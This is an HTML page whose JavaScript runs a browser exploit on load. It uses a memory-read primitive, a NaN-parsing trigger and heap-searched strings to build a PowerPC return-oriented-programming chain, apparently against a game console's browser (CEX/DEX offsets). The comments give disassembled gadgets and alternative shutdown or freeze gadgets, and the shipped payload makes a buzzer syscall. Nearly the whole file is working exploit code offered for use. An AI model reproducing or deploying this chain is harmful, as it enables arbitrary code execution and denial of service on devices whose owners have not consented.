<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		var search_base = 0x80150000;
		var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x8)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,g,j1,j2;
		var payload;
		var payload_addr=0;		
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;


		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze

	// gadget 1 =  unescape("\u7E2F\u0009\u76BC\u7E2F"); 	//seg001:0000000000010B30                 mr        r1, r11
															//seg001:0000000000010B34                 blr
	// same cex/dex in dump

		
	// gadget 2 =  unescape("\u7E2F\u01C6\u324C\u7E2F");	// The following gadget will basically set r28, r29 & r31 to use in next gadget
															//
															<!-- 01C6324C E8010130 ld         r0,0x130(r1)                   PIPE -->
	//E801013081810128->0x5C7324C  same cex/dex in dump		<!-- 01C63250 81810128 lwz        r12,0x128(r1) -->
															<!-- 01C63254 80610070 lwz        r3,0x70(r1)                    PIPE -->
															<!-- 01C63258 7C0803A6 mtspr      lr,r0 -->
															<!-- 01C6325C E9C10090 ld         r14,0x90(r1) -->
															<!-- 01C63260 7D908120 mtocrf     0x08,r12 -->
															<!-- 01C63264 E9E10098 ld         r15,0x98(r1) -->
															<!-- 01C63268 EA0100A0 ld         r16,0xA0(r1) -->
															<!-- 01C6326C EA2100A8 ld         r17,0xA8(r1)                   PIPE -->
															<!-- 01C63270 EA4100B0 ld         r18,0xB0(r1) -->
															<!-- 01C63274 EA6100B8 ld         r19,0xB8(r1)                   PIPE -->
															<!-- 01C63278 EA8100C0 ld         r20,0xC0(r1) -->
															<!-- 01C6327C EAA100C8 ld         r21,0xC8(r1)                   PIPE -->
															<!-- 01C63280 EAC100D0 ld         r22,0xD0(r1) -->
															<!-- 01C63284 EAE100D8 ld         r23,0xD8(r1)                   PIPE -->
															<!-- 01C63288 EB0100E0 ld         r24,0xE0(r1) -->
															<!-- 01C6328C EB2100E8 ld         r25,0xE8(r1)                   PIPE -->
															<!-- 01C63290 EB4100F0 ld         r26,0xF0(r1) -->
															<!-- 01C63294 EB6100F8 ld         r27,0xF8(r1)                   PIPE -->
															<!-- 01C63298 EB810100 ld         r28,0x100(r1) -->
															<!-- 01C6329C EBA10108 ld         r29,0x108(r1)                  PIPE -->
															<!-- 01C632A0 EBC10110 ld         r30,0x110(r1) -->
															<!-- 01C632A4 EBE10118 ld         r31,0x118(r1)                  PIPE -->
															<!-- 01C632A8 38210120 addi       r1,r1,0x120 -->
															<!-- 01C632AC 4E800020 blr				 -->
															//
															// not used
															<!-- 006161B8 81610074 lwz        r11,0x74(r1) -->
															<!-- 006161BC 81410078 lwz        r10,0x78(r1)                   PIPE -->
															<!-- 006161C0 8101007C lwz        r8,0x7C(r1) -->
															<!-- 006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE -->
															<!-- 006161C8 80C10084 lwz        r6,0x84(r1) -->
															//
	// gadget 3 =  unescape("\u7E2F\u0061\u61CC\u7E2F");	// Gadget 2 Start here   this gadget will set r3, r4 & r5
		// tested same dex/cex offset in dump				
															<!-- 006161CC 80A10088 lwz        r5,
															<!-- 006161D0 8081008C lwz        r4,0x8C(r1) -->
															<!-- 006161D4 80610090 lwz        r3,0x90(r1)                    PIPE -->
															<!-- 006161D8 81210094 lwz        r9,0x94(r1) -->
															<!-- 006161DC 80010070 lwz        r0,0x70(r1)                    PIPE -->
															<!-- 006161E0 913F0024 stw        r9,0x24(r31) -->
															<!-- 006161E4 901F0000 stw        r0,0x0(r31)                    PIPE -->
															<!-- 006161E8 917F0004 stw        r11,0x4(r31) -->
															<!-- 006161EC 915F0008 stw        r10,0x8(r31)                   PIPE -->
															<!-- 006161F0 911F000C stw        r8,0xC(r31) -->
															<!-- 006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE -->
															<!-- 006161F8 90DF0014 stw        r6,0x14(r31) -->
															<!-- 006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE -->
															<!-- 00616200 909F001C stw        r4,0x1C(r31) -->
															<!-- 00616204 907F0020 stw        r3,0x20(r31)                   PIPE -->
															<!-- 00616208 E80100D0 ld         r0,0xD0(r1) -->
															<!-- 0061620C 7FA307B4 extsw      r3,r29 -->
															<!-- 00616210 EBC100B0 ld         r30,0xB0(r1) -->
															<!-- 00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE -->
															<!-- 00616218 7C0803A6 mtspr      lr,r0 -->
															<!-- 0061621C EBE100B8 ld         r31,0xB8(r1) -->
															<!-- 00616220 382100C0 addi       r1,r1,0xC0 -->
															<!-- 00616224 4E800020 blr -->
															
															//loads the memcpy address into lr and execute the memcopy then load payload offset in lr for execution
	// gadget 4 =  unescape("\u7E2F\u0001\u4660\u7E2F");	// Gadget 4 here
															<!-- 00014660 486045C5 bl         0x00618C24  -->
															<!-- 00014664 		   nop					 -->
															<!-- 00014668          li         r9, 1 	-->
															<!-- 0001466C          b          0x0001449C -->
															<!-- 0001449C E80100F0 ld         r0,0xF0(r1)                    PIPE -->
															<!-- 000144A0 7D2307B4 extsw      r3,r9 -->
															<!-- 000144A4 EAA10088 ld         r21,0x88(r1) -->
															<!-- 000144A8 EAC10090 ld         r22,0x90(r1) -->
															<!-- 000144AC 7C0803A6 mtspr      lr,r0 -->
															<!-- 000144B0 EAE10098 ld         r23,0x98(r1) -->
															<!-- 000144B4 EB0100A0 ld         r24,0xA0(r1)                   PIPE -->
															<!-- 000144B8 EB2100A8 ld         r25,0xA8(r1) -->
															<!-- 000144BC EB4100B0 ld         r26,0xB0(r1)                   PIPE -->
															<!-- 000144C0 EB6100B8 ld         r27,0xB8(r1) -->
															<!-- 000144C4 EB8100C0 ld         r28,0xC0(r1)                   PIPE -->
															<!-- 000144C8 EBA100C8 ld         r29,0xC8(r1) -->
															<!-- 000144CC EBC100D0 ld         r30,0xD0(r1)                   PIPE -->
															<!-- 000144D0 EBE100D8 ld         r31,0xD8(r1) -->
															<!-- 000144D4 382100E0 addi       r1,r1,0xE0 -->
															<!-- 000144D8 4E800020 blr -->
															
															// Payload -  buzzer root syscall
															//38601004 3880000A 38A001B6 39600188 44000002 4E800020
															//00010000 38601004 li         r3,0x1004
															//00010004 3880000A li         r4,0xA                         PIPE
															//00010008 38A001B6 li         r5,0x1B6
															//0001000C 39600188 li         r11,0x188                      PIPE
															//00010010 44000002 sc                                       23 CSI
															//00010014 4E800020 blr 												

															//CEX
															//at 0x97604 you should find 7D615B784E800020
															//at 0x1c5324C you should find E801013081810128
															//at 0x568C94  you should find 80A100888081008C80610090
															//at 0x1449C you should find E80100F07D2307B4
		
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder
		payload_addr = findExploit("payload",payload,0x2F2A,0x8);
		}
		while(payload_addr==0);
		// DEX
		<!-- gadget =  unescape("\u4444\u0009\u76BC\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump -->
		<!-- gadget =  gadget+unescape("\u01C6\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes -->
		<!-- gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0C70\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0061\u61CC\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump -->
		<!-- gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0C70\u0909\u0909\u4141"); //122 bytes -->
		<!-- gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes -->
		<!-- gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes -->
		
		// cex
		gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes


		gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x7E2A,0x1B8);
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2A2F");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));	
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		dbg("payload: "+a2hex(payload));
		dbg("payload variable offset: "+payload_addr.toString(16));
		dbg("gadget: "+a2hex(g));
		dbg("gadget variable offset: "+gadget_addr.toString(16));
		dbg("gadget: "+a2hex(j2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		dbg("gadget: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, refresh the page because the exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
